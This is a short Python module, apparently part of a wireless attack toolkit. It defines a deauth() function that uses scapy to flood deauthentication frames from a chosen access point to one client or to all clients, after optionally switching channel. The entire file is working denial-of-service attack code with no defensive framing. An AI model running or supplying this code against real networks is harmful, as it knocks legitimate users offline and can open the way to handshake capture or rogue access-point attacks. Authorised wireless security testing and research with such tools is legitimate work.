"""Deauthentication flood against an AP or a specific client."""

from __future__ import annotations

from scapy.sendrecv import sendp

from ..frames import BROADCAST, craft_deauth
from ..radio import set_channel


def deauth(
    iface: str,
    bssid: str,
    client: str = BROADCAST,
    count: int = 64,
    interval: float = 0.05,
    channel: int | None = None,
) -> int:
    """Send count deauth frames from bssid to client; returns frames sent."""
    if channel is not None:
        set_channel(iface, channel)
    pkt = craft_deauth(bssid=bssid, client=client)
    sendp(pkt, iface=iface, count=count, inter=interval, verbose=False)
    return count
